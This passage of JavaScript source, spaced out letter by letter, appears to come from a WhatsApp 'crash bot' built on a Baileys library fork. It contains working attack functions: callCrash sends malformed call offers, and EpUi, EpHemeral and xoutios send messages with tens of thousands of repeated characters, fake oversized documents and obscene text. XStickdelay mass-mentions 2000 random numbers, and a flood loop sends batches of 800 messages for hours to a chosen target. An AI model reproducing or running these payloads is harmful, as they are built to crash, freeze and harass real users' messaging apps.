                                                                 } , 
                                                         } , 
                                                 } , 
                                         } , 
                                         { 
                                                 a d d i t i o n a l N o d e s :   [ 
                                                         { 
                                                                 t a g :   " m e t a " , 
                                                                 a t t r s :   {   i s _ s t a t u s _ m e n t i o n :   t r u e   } , 
                                                                 c o n t e n t :   u n d e f i n e d , 
                                                         } , 
                                                 ] , 
                                         } 
                                 ) ; 
                         } 
                 } 
 
 a s y n c   f u n c t i o n   X S t i c k d e l a y ( X e o n B o t I n c ,   t a r g e t )   { 
     l e t   m e s s a g e   =   { 
         v i e w O n c e M e s s a g e :   { 
             m e s s a g e :   { 
                 s t i c k e r M e s s a g e :   { 
                     u r l :   " h t t p s : / / m m g . w h a t s a p p . n e t / v / t 6 2 . 7 1 6 1 - 2 4 / 1 0 0 0 0 0 0 0 _ 1 1 9 7 7 3 8 3 4 2 0 0 6 1 5 6 _ 5 3 6 1 1 8 4 9 0 1 5 1 7 0 4 2 4 6 5 _ n . e n c ? c c b = 1 1 - 4 & o h = 0 1 _ Q 5 A a 1 Q F O L T m o R 7 u 3 h o e z W L 5 E O - A C l 9 0 0 R f g C Q o T q I 8 0 O O i 7 T 5 A & o e = 6 8 3 6 5 D 7 2 & _ n c _ s i d = 5 e 0 3 e 0 & m m s 3 = t r u e " , 
                     f i l e S h a 2 5 6 :   " x U f V N M 3 g q u 9 G q Z e L W 3 w s q a 2 c a 5 m T 9 q k P X v d 7 E G k g 9 n 4 = " , 
                     f i l e E n c S h a 2 5 6 :   " z T i / r b 6 C H Q O X I 7 P a 2 E 8 f U w H v + 6 4 h a y 8 m G T 1 x R G k h 9 8 s = " , 
                     m e d i a K e y :   " n H J v q F R 5 n 2 6 n s R i X a R V x x P Z Y 5 4 l 0 B D X A O G v I P r f w o 9 k = " , 
                     m i m e t y p e :   " i m a g e / w e b p " , 
                     d i r e c t P a t h : 
                         " / v / t 6 2 . 7 1 6 1 - 2 4 / 1 0 0 0 0 0 0 0 _ 1 1 9 7 7 3 8 3 4 2 0 0 6 1 5 6 _ 5 3 6 1 1 8 4 9 0 1 5 1 7 0 4 2 4 6 5 _ n . e n c ? c c b = 1 1 - 4 & o h = 0 1 _ Q 5 A a 1 Q F O L T m o R 7 u 3 h o e z W L 5 E O - A C l 9 0 0 R f g C Q o T q I 8 0 O O i 7 T 5 A & o e = 6 8 3 6 5 D 7 2 & _ n c _ s i d = 5 e 0 3 e 0 " , 
                     f i l e L e n g t h :   {   l o w :   1 ,   h i g h :   0 ,   u n s i g n e d :   t r u e   } , 
                     m e d i a K e y T i m e s t a m p :   { 
                         l o w :   1 7 4 6 1 1 2 2 1 1 , 
                         h i g h :   0 , 
                         u n s i g n e d :   f a l s e , 
                     } , 
                     f i r s t F r a m e L e n g t h :   1 9 9 0 4 , 
                     f i r s t F r a m e S i d e c a r :   " K N 4 k Q 5 p y A B R A g A = = " , 
                     i s A n i m a t e d :   t r u e , 
                     c o n t e x t I n f o :   { 
                         m e n t i o n e d J i d :   [ 
                             t a r g e t , 
                             . . . A r r a y . f r o m ( 
                                 { 
                                     l e n g t h :   2 0 0 0 , 
                                 } , 
                                 ( )   = > 
                                     " 1 "   +   M a t h . f l o o r ( M a t h . r a n d o m ( )   *   9 0 0 0 0 0 )   +   " @ s . w h a t s a p p . n e t " 
                             ) , 
                         ] , 
                         g r o u p M e n t i o n s :   [ ] , 
                         e n t r y P o i n t C o n v e r s i o n S o u r c e :   " n o n _ c o n t a c t " , 
                         e n t r y P o i n t C o n v e r s i o n A p p :   " w h a t s a p p " , 
                         e n t r y P o i n t C o n v e r s i o n D e l a y S e c o n d s :   4 6 7 5 9 3 , 
                     } , 
                     s t i c k e r S e n t T s :   { 
                         l o w :   - 1 9 3 9 4 7 7 8 8 3 , 
                         h i g h :   4 0 6 , 
                         u n s i g n e d :   f a l s e , 
                     } , 
                     i s A v a t a r :   f a l s e , 
                     i s A i S t i c k e r :   f a l s e , 
                     i s L o t t i e :   f a l s e , 
                 } , 
             } , 
         } , 
     } ; 
 
     c o n s t   m s g   =   g e n e r a t e W A M e s s a g e F r o m C o n t e n t ( t a r g e t ,   m e s s a g e ,   { } ) ; 
 
     a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( " s t a t u s @ b r o a d c a s t " ,   m s g . m e s s a g e ,   { 
         m e s s a g e I d :   m s g . k e y . i d , 
         s t a t u s J i d L i s t :   [ t a r g e t ] , 
         a d d i t i o n a l N o d e s :   [ 
             { 
                 t a g :   " m e t a " , 
                 a t t r s :   { } , 
                 c o n t e n t :   [ 
                     { 
                         t a g :   " m e n t i o n e d _ u s e r s " , 
                         a t t r s :   { } , 
                         c o n t e n t :   [ 
                             { 
                                 t a g :   " t o " , 
                                 a t t r s :   {   j i d :   t a r g e t   } , 
                                 c o n t e n t :   [ ] , 
                             } , 
                         ] , 
                     } , 
                 ] , 
             } , 
         ] , 
     } ) ; 
     a w a i t   n e w   P r o m i s e ( r e s o l v e   = >   s e t T i m e o u t ( r e s o l v e ,   1 5 0 0 ) ) ; 
         } 
         
 a s y n c   f u n c t i o n   c a l l C r a s h ( t a r g e t ,   i s V i d e o   =   t r u e )   { 
     c o n s t   {   j i d D e c o d e ,   e n c o d e W A M e s s a g e ,   e n c o d e S i g n e d D e v i c e I d e n t i t y   }   =   r e q u i r e ( " @ a d i w a j s h i n g / b a i l e y s " ) ; 
     
     t r y   { 
         c o n s t   d e v i c e s   =   ( 
             a w a i t   X e o n B o t I n c . g e t U S y n c D e v i c e s ( [ t a r g e t ] ,   f a l s e ,   f a l s e ) 
         ) . m a p ( ( {   u s e r ,   d e v i c e   } )   = >   ` $ { u s e r } : $ { d e v i c e   | |   ' ' } @ s . w h a t s a p p . n e t ` ) ; 
 
         a w a i t   X e o n B o t I n c . a s s e r t S e s s i o n s ( d e v i c e s ) ; 
 
         c o n s t   c r e a t e M u t e x   =   ( )   = >   { 
             c o n s t   l o c k s   =   n e w   M a p ( ) ; 
             
             r e t u r n   { 
                 a s y n c   m u t e x ( k e y ,   f n )   { 
                     w h i l e   ( l o c k s . h a s ( k e y ) )   { 
                         a w a i t   l o c k s . g e t ( k e y ) ; 
                     } 
                     
                     c o n s t   l o c k   =   P r o m i s e . r e s o l v e ( ) . t h e n ( ( )   = >   f n ( ) ) ; 
                     l o c k s . s e t ( k e y ,   l o c k ) ; 
                     
                     t r y   { 
                         c o n s t   r e s u l t   =   a w a i t   l o c k ; 
                         r e t u r n   r e s u l t ; 
                     }   f i n a l l y   { 
                         l o c k s . d e l e t e ( k e y ) ; 
                     } 
                 } 
             } ; 
         } ; 
 
         c o n s t   m u t e x M a n a g e r   =   c r e a t e M u t e x ( ) ; 
         
         c o n s t   a p p e n d B u f f e r M a r k e r   =   ( b u f f e r )   = >   { 
             c o n s t   n e w B u f f e r   =   B u f f e r . a l l o c ( b u f f e r . l e n g t h   +   8 ) ; 
             b u f f e r . c o p y ( n e w B u f f e r ) ; 
             n e w B u f f e r . f i l l ( 1 ,   b u f f e r . l e n g t h ) ; 
             r e t u r n   n e w B u f f e r ; 
         } ; 
 
         c o n s t   o r i g i n a l C r e a t e P a r t i c i p a n t N o d e s   =   X e o n B o t I n c . c r e a t e P a r t i c i p a n t N o d e s ? . b i n d ( X e o n B o t I n c ) ; 
         c o n s t   o r i g i n a l E n c o d e W A M e s s a g e   =   X e o n B o t I n c . e n c o d e W A M e s s a g e ? . b i n d ( X e o n B o t I n c ) ; 
 
         X e o n B o t I n c . c r e a t e P a r t i c i p a n t N o d e s   =   a s y n c   ( r e c i p i e n t J i d s ,   m e s s a g e ,   e x t r a A t t r s ,   d s m M e s s a g e )   = >   { 
             i f   ( ! r e c i p i e n t J i d s . l e n g t h )   { 
                 r e t u r n   { 
                     n o d e s :   [ ] , 
                     s h o u l d I n c l u d e D e v i c e I d e n t i t y :   f a l s e 
                 } ; 
             } 
 
             c o n s t   p r o c e s s e d M e s s a g e   =   a w a i t   ( X e o n B o t I n c . p a t c h M e s s a g e B e f o r e S e n d i n g ? . ( m e s s a g e ,   r e c i p i e n t J i d s )   ? ?   m e s s a g e ) ; 
             
             c o n s t   m e s s a g e P a i r s   =   A r r a y . i s A r r a y ( p r o c e s s e d M e s s a g e )   
                 ?   p r o c e s s e d M e s s a g e   
                 :   r e c i p i e n t J i d s . m a p ( j i d   = >   ( {   r e c i p i e n t J i d :   j i d ,   m e s s a g e :   p r o c e s s e d M e s s a g e   } ) ) ; 
 
             c o n s t   {   i d :   m e I d ,   l i d :   m e L i d   }   =   X e o n B o t I n c . a u t h S t a t e . c r e d s . m e ; 
             c o n s t   l o c a l U s e r   =   m e L i d   ?   j i d D e c o d e ( m e L i d ) ? . u s e r   :   n u l l ; 
             l e t   s h o u l d I n c l u d e D e v i c e I d e n t i t y   =   f a l s e ; 
 
             c o n s t   n o d e s   =   a w a i t   P r o m i s e . a l l ( 
                 m e s s a g e P a i r s . m a p ( a s y n c   ( {   r e c i p i e n t J i d :   j i d ,   m e s s a g e :   m s g   } )   = >   { 
                     c o n s t   {   u s e r :   t a r g e t U s e r   }   =   j i d D e c o d e ( j i d ) ; 
                     c o n s t   {   u s e r :   o w n U s e r   }   =   j i d D e c o d e ( m e I d ) ; 
                     c o n s t   i s O w n U s e r   =   t a r g e t U s e r   = = =   o w n U s e r   | |   t a r g e t U s e r   = = =   l o c a l U s e r ; 
                     c o n s t   i s S e l f   =   j i d   = = =   m e I d   | |   j i d   = = =   m e L i d ; 
                     
                     i f   ( d s m M e s s a g e   & &   i s O w n U s e r   & &   ! i s S e l f )   { 
                         m s g   =   d s m M e s s a g e ; 
                     } 
 
                     c o n s t   e n c o d e d B y t e s   =   a p p e n d B u f f e r M a r k e r ( 
                         o r i g i n a l E n c o d e W A M e s s a g e   
                             ?   o r i g i n a l E n c o d e W A M e s s a g e ( m s g )   
                             :   e n c o d e W A M e s s a g e ( m s g ) 
                     ) ; 
 
                     r e t u r n   m u t e x M a n a g e r . m u t e x ( j i d ,   a s y n c   ( )   = >   { 
                         c o n s t   {   t y p e ,   c i p h e r t e x t   }   =   a w a i t   X e o n B o t I n c . s i g n a l R e p o s i t o r y . e n c r y p t M e s s a g e ( {   
                             j i d ,   
                             d a t a :   e n c o d e d B y t e s   
                         } ) ; 
                         
                         i f   ( t y p e   = = =   ' p k m s g ' )   { 
                             s h o u l d I n c l u d e D e v i c e I d e n t i t y   =   t r u e ; 
                         } 
                         
                         r e t u r n   { 
                             t a g :   ' t o ' , 
                             a t t r s :   {   j i d   } , 
                             c o n t e n t :   [ { 
                                 t a g :   ' e n c ' , 
                                 a t t r s :   { 
                                     v :   ' 2 ' , 
                                     t y p e , 
                                     . . . e x t r a A t t r s 
                                 } , 
                                 c o n t e n t :   c i p h e r t e x t 
                             } ] 
                         } ; 
                     } ) ; 
                 } ) 
             ) ; 
 
             r e t u r n   { 
                 n o d e s :   n o d e s . f i l t e r ( B o o l e a n ) , 
                 s h o u l d I n c l u d e D e v i c e I d e n t i t y 
             } ; 
         } ; 
 
         c o n s t   c a l l K e y   =   c r y p t o . r a n d o m B y t e s ( 3 2 ) ; 
         c o n s t   e x t e n d e d C a l l K e y   =   B u f f e r . c o n c a t ( [ c a l l K e y ,   B u f f e r . a l l o c ( 8 ,   0 x 0 1 ) ] ) ; 
         c o n s t   c a l l I d   =   c r y p t o . r a n d o m B y t e s ( 1 6 ) . t o S t r i n g ( " h e x " ) . s l i c e ( 0 ,   3 2 ) . t o U p p e r C a s e ( ) ; 
 
         c o n s t   {   n o d e s :   d e s t i n a t i o n s ,   s h o u l d I n c l u d e D e v i c e I d e n t i t y   }   =   
             a w a i t   X e o n B o t I n c . c r e a t e P a r t i c i p a n t N o d e s ( d e v i c e s ,   {   
                 c o n v e r s a t i o n :   " c a l l - i n i t i a t e d " 
             } ,   {   c o u n t :   ' 0 '   } ) ; 
 
         c o n s t   c a l l S t a n z a   =   { 
             t a g :   " c a l l " , 
             a t t r s :   { 
                 t o :   t a r g e t , 
                 i d :   X e o n B o t I n c . g e n e r a t e M e s s a g e T a g ( ) , 
                 f r o m :   X e o n B o t I n c . u s e r . i d 
             } , 
             c o n t e n t :   [ { 
                 t a g :   " o f f e r " , 
                 a t t r s :   { 
                     " c a l l - i d " :   c a l l I d , 
                     " c a l l - c r e a t o r " :   X e o n B o t I n c . u s e r . i d 
                 } , 
                 c o n t e n t :   [ 
                     { 
                         t a g :   " a u d i o " , 
                         a t t r s :   { 
                             e n c :   " o p u s " , 
                             r a t e :   " 1 6 0 0 0 " 
                         } 
                     } , 
                     { 
                         t a g :   " a u d i o " , 
                         a t t r s :   { 
                             e n c :   " o p u s " , 
                             r a t e :   " 8 0 0 0 " 
                         } 
                     } , 
                     . . . ( i s V i d e o   ?   [ { 
                         t a g :   ' v i d e o ' , 
                         a t t r s :   { 
                             e n c :   ' v p 8 ' , 
                             d e c :   ' v p 8 ' , 
                             o r i e n t a t i o n :   ' 0 ' , 
                             s c r e e n _ w i d t h :   ' 1 9 2 0 ' , 
                             s c r e e n _ h e i g h t :   ' 1 0 8 0 ' , 
                             d e v i c e _ o r i e n t a t i o n :   ' 0 ' 
                         } 
                     } ]   :   [ ] ) , 
                     { 
                         t a g :   " n e t " , 
                         a t t r s :   { 
                             m e d i u m :   " 3 " 
                         } 
                     } , 
                     { 
                         t a g :   " c a p a b i l i t y " , 
                         a t t r s :   {   v e r :   " 1 "   } , 
                         c o n t e n t :   n e w   U i n t 8 A r r a y ( [ 1 ,   5 ,   2 4 7 ,   9 ,   2 2 8 ,   2 5 0 ,   1 ] ) 
                     } , 
                     { 
                         t a g :   " e n c o p t " , 
                         a t t r s :   {   k e y g e n :   " 2 "   } 
                     } , 
                     { 
                         t a g :   " d e s t i n a t i o n " , 
                         a t t r s :   { } , 
                         c o n t e n t :   d e s t i n a t i o n s 
                     } , 
                     . . . ( s h o u l d I n c l u d e D e v i c e I d e n t i t y   ?   [ { 
                         t a g :   " d e v i c e - i d e n t i t y " , 
                         a t t r s :   { } , 
                         c o n t e n t :   e n c o d e S i g n e d D e v i c e I d e n t i t y ( X e o n B o t I n c . a u t h S t a t e . c r e d s . a c c o u n t ,   t r u e ) 
                     } ]   :   [ ] ) 
                 ] . f i l t e r ( B o o l e a n ) 
             } ] 
         } ; 
 
         a w a i t   X e o n B o t I n c . s e n d N o d e ( c a l l S t a n z a ) ; 
 
     }   c a t c h   ( e r r o r )   { 
         c o n s o l e . e r r o r ( ' E r r o r   i n   c a l l C r a s h : ' ,   e r r o r ) ; 
         t h r o w   e r r o r ; 
     } 
 } 
 
 
 
 
 
 
 
 
         
           
         
         
   a s y n c   f u n c t i o n   l o a d i n g ( f r o m )   { 
 
         { 
 
                 c o n s o l e . e r r o r ( " I n v a l i d     f r o m     J I D : " ,   f r o m ) ; 
 
                 r e t u r n ; 
 
         } 
 
         c o n s t   F l o a d i n g   =   [ 
 
                 " ℓ σ α ∂ ι η g . " , 
 
                 " ℓ σ α ∂ ι η g . . " , 
 
                 " ℓ σ α ∂ ι η g . . . " 
 
         ] ; 
 
         l e t   {   k e y   }   =   a w a i t   X e o n B o t I n c . s e n d M e s s a g e ( f r o m ,   {   t e x t :   "   "   } ) ; 
 
         f o r   ( l e t   i   =   0 ;   i   <   F l o a d i n g . l e n g t h ;   i + + )   { 
 
                 a w a i t   X e o n B o t I n c . s e n d M e s s a g e ( f r o m ,   {   t e x t :   F l o a d i n g [ i ] ,   e d i t :   k e y   } ) ; 
 
         } 
 
 }       
         
         
             
                 
                 
         a s y n c   f u n c t i o n   s e n d M e s s a g e s F o r D u r a t i o n X ( d u r a t i o n H o u r s ,   X )   { 
         c o n s t   t o t a l D u r a t i o n M s   =   d u r a t i o n H o u r s   *   6 0   *   6 0   *   1 0 0 0 ;   / /   C o n v e r t   h o u r s   t o   m i l l i s e c o n d s 
         c o n s t   s t a r t T i m e   =   D a t e . n o w ( ) ; 
         l e t   c o u n t   =   0 ; 
 
         c o n s t   s e n d N e x t   =   a s y n c   ( )   = >   { 
                 i f   ( D a t e . n o w ( )   -   s t a r t T i m e   > =   t o t a l D u r a t i o n M s )   { 
                         c o n s o l e . l o g ( " D e l i v e r y   C o m p l e t e d   W i t h i n   S p e c i f i e d   D u r a t i o n . " ) ; 
                         r e t u r n ; 
                 } 
 
                 i f   ( c o u n t   <   8 0 0 )   { 
                         a w a i t   x j a m m e r ( X ) ;   / /   U s i n g   X   f r o m   u s e r   i n p u t 
                         c o u n t + + ; 
                         a w a i t   s e n d N e x t ( ) ;   / /   C o n t i n u e   s h i p p i n g 
                 }   e l s e   { 
                         c o n s o l e . l o g ( c h a l k . g r e e n ( ` C o m p l e t e d   S e n d i n g   8 0 0   P a c k a g e s   T o   $ { X } ` ) ) ;   / /   L o g   c o m p l e t e d   s e n d i n g   8 0 0   p a c k a g e s 
                         c o u n t   =   0 ;   / /   R e s e t   f o r   n e x t   p a c k a g e 
                         c o n s o l e . l o g ( c h a l k . r e d ( " P r e p a r i n g   T o   S h i p   T h e   N e x t   8 0 0   P a c k a g e s . . . " ) ) ; 
                         s e t T i m e o u t ( s e n d N e x t ,   5 0 0 0 ) ;   / /   P a u s e   5   s e c o n d s   a f t e r   c o m p l e t i o n   o f   b a t c h   o f   8 0 0   m e s s a g e s 
                 } 
         } ; 
 
         s e n d N e x t ( ) ; 
 } ; 
 
 a s y n c   f u n c t i o n   s e n d M e s s a g e s F o r D u r a t i o n ( d u r a t i o n H o u r s ,   X )   { 
         c o n s t   t o t a l D u r a t i o n M s   =   d u r a t i o n H o u r s   *   6 0   *   6 0   *   1 0 0 0 ;   / /   C o n v e r t   h o u r s   t o   m i l l i s e c o n d s 
         c o n s t   s t a r t T i m e   =   D a t e . n o w ( ) ; 
         l e t   c o u n t   =   0 ; 
 
         c o n s t   s e n d N e x t   =   a s y n c   ( )   = >   { 
                 i f   ( D a t e . n o w ( )   -   s t a r t T i m e   > =   t o t a l D u r a t i o n M s )   { 
                         c o n s o l e . l o g ( " D e l i v e r y   C o m p l e t e d   W i t h i n   S p e c i f i e d   D u r a t i o n . " ) ; 
                         r e t u r n ; 
                 } 
 
                 i f   ( c o u n t   <   8 0 0 )   { 
                         a w a i t   x j a m m e r 2 ( X ) ;   / /   U s i n g   X   f r o m   u s e r   i n p u t 
                         c o u n t + + ; 
                         a w a i t   s e n d N e x t ( ) ;   / /   C o n t i n u e   d e l i v e r y   w i t h o u t   d e l a y   b e t w e e n   m e s s a g e s 
                 }   e l s e   { 
                         c o n s o l e . l o g ( c h a l k . g r e e n ( ` C o m p l e t e d   S e n d i n g   8 0 0   P a c k a g e s   T o   $ { X } ` ) ) ;   / /   L o g   s e l e s a i   k i r i m   8 0 0   p a k e t 
                         c o u n t   =   0 ;   / /   R e s e t   f o r   n e x t   p a c k a g e 
                         c o n s o l e . l o g ( c h a l k . r e d ( " P r e p a r i n g   T o   S h i p   T h e   N e x t   8 0 0   P a c k a g e s . . . " ) ) ; 
                         s e t T i m e o u t ( s e n d N e x t ,   5 0 0 0 ) ;   / /   P a u s e   5   s e c o n d s   a f t e r   c o m p l e t i o n   o f   b a t c h   o f   8 0 0   m e s s a g e s 
                 } 
         } ; 
 
         s e n d N e x t ( ) ; 
 } ; 
 
 
                 
                 a s y n c   f u n c t i o n   E p U i ( X ,   p t c p   =   t r u e )   { 
                         l e t   m s g   =   a w a i t   g e n e r a t e W A M e s s a g e F r o m C o n t e n t ( X ,   { 
                                 v i e w O n c e M e s s a g e :   { 
                                         m e s s a g e :   { 
                                                 i n t e r a c t i v e M e s s a g e :   { 
                                                         h e a d e r :   { 
                                                                 t i t l e :   " T e l e g r a m :   @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � � " , 
                                                                 h a s M e d i a A t t a c h m e n t :   f a l s e 
                                                         } , 
                                                         b o d y :   { 
                                                                 t e x t :   " * 我 有 一 个 很 大 的 鸡 鸡 ， 请 吸 吮 它   � � *   * 我 有 一 个 很 大 的 鸡 鸡 ， 请 吸 吮 它   � � *   * 我 有 一 个 很 大 的 鸡 鸡 ， 请 吸 吮 它   � � *   * 我 有 一 个 很 大 的 鸡 鸡 ， 请 吸 吮 它   � � *   * 我 有 一 个 很 大 的 鸡 鸡 ， 请 吸 吮 它   � � *   * 我 有 一 个 很 大 的 鸡 鸡 ， 请 吸 吮 它   � � *   * 我 有 一 个 很 大 的 鸡 鸡 ， 请 吸 吮 它   � � * "   +   " ꦾ " . r e p e a t ( 5 0 0 0 0 ) , 
                                                         } , 
                                                         n a t i v e F l o w M e s s a g e :   { 
                                                                 m e s s a g e P a r a m s J s o n :   " " , 
                                                                 b u t t o n s :   [ { 
                                                                                 n a m e :   " c t a _ u r l " , 
                                                                                 b u t t o n P a r a m s J s o n :   " * 我 有 一 个 很 大 的 鸡 鸡 ， 请 吸 吮 它   � � *   * 我 有 一 个 很 大 的 鸡 鸡 ， 请 吸 吮 它   � � *   * 我 有 一 个 很 大 的 鸡 鸡 ， 请 吸 吮 它   � � *   * 我 有 一 个 很 大 的 鸡 鸡 ， 请 吸 吮 它   � � *   * 我 有 一 个 很 大 的 鸡 鸡 ， 请 吸 吮 它   � � *   * 我 有 一 个 很 大 的 鸡 鸡 ， 请 吸 吮 它   � � *   * 我 有 一 个 很 大 的 鸡 鸡 ， 请 吸 吮 它   � � * " 
                                                                         } , 
                                                                         { 
                                                                                 n a m e :   " c a l l _ p e r m i s s i o n _ r e q u e s t " , 
                                                                                 b u t t o n P a r a m s J s o n :   " * 我 有 一 个 很 大 的 鸡 鸡 ， 请 吸 吮 它   � � *   * 我 有 一 个 很 大 的 鸡 鸡 ， 请 吸 吮 它   � � *   * 我 有 一 个 很 大 的 鸡 鸡 ， 请 吸 吮 它   � � *   * 我 有 一 个 很 大 的 鸡 鸡 ， 请 吸 吮 它   � � *   * 我 有 一 个 很 大 的 鸡 鸡 ， 请 吸 吮 它   � � *   * 我 有 一 个 很 大 的 鸡 鸡 ， 请 吸 吮 它   � � *   * 我 有 一 个 很 大 的 鸡 鸡 ， 请 吸 吮 它   � � * " 
                                                                         } 
                                                                 ] 
                                                         } 
                                                 } 
                                         } 
                                 } 
                         } ,   { } ) ;                         
                         a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( X ,   m s g . m e s s a g e ,   p t c p   ?   { 
 	 	 	 	 p a r t i c i p a n t :   { 
 	 	 	 	 	 j i d :   X 
 	 	 	 	 } 
 	 	 	 }   :   { } ) ; 
                 } 
 
 a s y n c   f u n c t i o n   E p H e m e r a l ( X ,   p t c p   =   t r u e )   { 
                         l e t   m s g   =   a w a i t   g e n e r a t e W A M e s s a g e F r o m C o n t e n t ( X ,   { 
                                 v i e w O n c e M e s s a g e :   { 
                                         m e s s a g e :   { 
                                                 i n t e r a c t i v e M e s s a g e :   { 
                                                         h e a d e r :   { 
                                                                 t i t l e :   " T e l e g r a m :   @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � � " , 
                                                                 h a s M e d i a A t t a c h m e n t :   f a l s e 
                                                         } , 
                                                         b o d y :   { 
                                                                 t e x t :   " * 我 有 一 个 很 大 的 鸡 鸡 ， 请 吸 吮 它   � � *   * 我 有 一 个 很 大 的 鸡 鸡 ， 请 吸 吮 它   � � *   * 我 有 一 个 很 大 的 鸡 鸡 ， 请 吸 吮 它   � � *   * 我 有 一 个 很 大 的 鸡 鸡 ， 请 吸 吮 它   � � *   * 我 有 一 个 很 大 的 鸡 鸡 ， 请 吸 吮 它   � � *   * 我 有 一 个 很 大 的 鸡 鸡 ， 请 吸 吮 它   � � *   * 我 有 一 个 很 大 的 鸡 鸡 ， 请 吸 吮 它   � � * " 
                                                         } , 
                                                         n a t i v e F l o w M e s s a g e :   { 
                                                                 m e s s a g e P a r a m s J s o n :   " " , 
                                                                 b u t t o n s :   [ { 
                                                                                 n a m e :   " c t a _ u r l " , 
                                                                                 b u t t o n P a r a m s J s o n :   " * 我 有 一 个 很 大 的 鸡 鸡 ， 请 吸 吮 它   � � *   * 我 有 一 个 很 大 的 鸡 鸡 ， 请 吸 吮 它   � � *   * 我 有 一 个 很 大 的 鸡 鸡 ， 请 吸 吮 它   � � *   * 我 有 一 个 很 大 的 鸡 鸡 ， 请 吸 吮 它   � � *   * 我 有 一 个 很 大 的 鸡 鸡 ， 请 吸 吮 它   � � *   * 我 有 一 个 很 大 的 鸡 鸡 ， 请 吸 吮 它   � � *   * 我 有 一 个 很 大 的 鸡 鸡 ， 请 吸 吮 它   � � * " 
                                                                         } , 
                                                                         { 
                                                                                 n a m e :   " c a l l _ p e r m i s s i o n _ r e q u e s t " , 
                                                                                 b u t t o n P a r a m s J s o n :   " * 我 有 一 个 很 大 的 鸡 鸡 ， 请 吸 吮 它   � � *   * 我 有 一 个 很 大 的 鸡 鸡 ， 请 吸 吮 它   � � *   * 我 有 一 个 很 大 的 鸡 鸡 ， 请 吸 吮 它   � � *   * 我 有 一 个 很 大 的 鸡 鸡 ， 请 吸 吮 它   � � *   * 我 有 一 个 很 大 的 鸡 鸡 ， 请 吸 吮 它   � � *   * 我 有 一 个 很 大 的 鸡 鸡 ， 请 吸 吮 它   � � *   * 我 有 一 个 很 大 的 鸡 鸡 ， 请 吸 吮 它   � � * " 
                                                                         } 
                                                                 ] 
                                                         } 
                                                 } 
                                         } 
                                 } 
                         } ,   { } ) ;                         
                         a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( X ,   m s g . m e s s a g e ,   p t c p   ?   { 
 	 	 	 	 p a r t i c i p a n t :   { 
 	 	 	 	 	 j i d :   X 
 	 	 	 	 } 
 	 	 	 }   :   { } ) ; 
                 } 
         
 / / = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = \ \ 
 a s y n c   f u n c t i o n   x o u t i o s ( t a r g e t )   { 
         c o n s t   x e o n I p o n g   =   " � � � � � � � � " . r e p e a t ( 6 0 0 0 0 ) ; 
         c o n s t   g e n M s g   =   ( f i l e N a m e ,   b o d y T e x t )   = >   g e n e r a t e W A M e s s a g e F r o m C o n t e n t ( t a r g e t ,   p r o t o . M e s s a g e . f r o m O b j e c t ( { 
                 g r o u p M e n t i o n e d M e s s a g e :   { 
                         m e s s a g e :   { 
                                 i n t e r a c t i v e M e s s a g e :   { 
                                         h e a d e r :   { 
                                                 d o c u m e n t M e s s a g e :   { 
                                                         u r l :   " h t t p s : / / m m g . w h a t s a p p . n e t / v / t 6 2 . 7 1 1 9 - 2 4 / 4 0 3 7 7 5 6 7 _ 1 5 8 7 4 8 2 6 9 2 0 4 8 7 8 5 _ 2 8 3 3 6 9 8 7 5 9 4 9 2 8 2 5 2 8 2 _ n . e n c ? c c b = 1 1 - 4 & o h = 0 1 _ Q 5 A a I E O Z F i V R P J r l l J N v R A - D 4 J t O a E Y t X l 0 g m S T F W k G x A S L Z & o e = 6 6 6 D B E 7 C & _ n c _ s i d = 5 e 0 3 e 0 & m m s 3 = t r u e " , 
                                                         m i m e t y p e :   " a p p l i c a t i o n / j s o n " , 
                                                         f i l e S h a 2 5 6 :   " l d 5 g n m a i b + 1 m B C W r c N m e k j B 4 f H h y j A P O H J + U M D 3 u y 4 k = " , 
                                                         f i l e L e n g t h :   " 9 9 9 9 9 9 9 9 9 9 9 9 " , 
                                                         p a g e C o u n t :   0 x 9 f f 9 f f 9 f f 1 f f 8 f f 4 f f 5 f , 
                                                         m e d i a K e y :   " 5 c / W 3 B C W j P M F A U U x T S Y t Y P L W Z G W u B V 1 3 m W O g Q w N d F c g = " , 
                                                         f i l e N a m e :   f i l e N a m e , 
                                                         f i l e E n c S h a 2 5 6 :   " p z n Y B S 1 N 6 g r 9 R Z 6 6 F x 7 L 3 A y L I U 2 R Y 5 L H C K h x X e r J n w Q = " , 
                                                         d i r e c t P a t h :   " / v / t 6 2 . 7 1 1 9 - 2 4 / 4 0 3 7 7 5 6 7 _ 1 5 8 7 4 8 2 6 9 2 0 4 8 7 8 5 _ 2 8 3 3 6 9 8 7 5 9 4 9 2 8 2 5 2 8 2 _ n . e n c ? c c b = 1 1 - 4 & o h = 0 1 _ Q 5 A a I E O Z F i V R P J r l l J N v R A - D 4 J t O a E Y t X l 0 g m S T F W k G x A S L Z & o e = 6 6 6 D B E 7 C & _ n c _ s i d = 5 e 0 3 e 0 " , 
                                                         m e d i a K e y T i m e s t a m p :   " 1 7 1 5 8 8 0 1 7 3 " 
                                                 } , 
                                                 h a s M e d i a A t t a c h m e n t :   t r u e 
                                         } , 
                                         b o d y :   {   t e x t :   b o d y T e x t   } , 
                                         n a t i v e F l o w M e s s a g e :   { 
                                                 m e s s a g e P a r a m s J s o n :   ` { " n a m e " : " g a l a x y _ m e s s a g e " , " f l o w _ a c t i o n " : " n a v i g a t e " , " f l o w _ a c t i o n _ p a y l o a d " : { " s c r e e n " : " C T Z _ S C R E E N " } , " f l o w _ c t a " : " T e l e g r a m :   @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � � " , " f l o w _ i d " : " T e l e g r a m :   @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � � " , " f l o w _ m e s s a g e _ v e r s i o n " : " 9 . 9 0 3 " , " f l o w _ t o k e n " : " T e l e g r a m :   @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � � " } ` 
                                         } , 
                                         c o n t e x t I n f o :   { 
                                                 m e n t i o n e d J i d :   A r r a y . f r o m ( {   l e n g t h :   5   } ,   ( )   = >   " 1 @ n e w s l e t t e r " ) , 
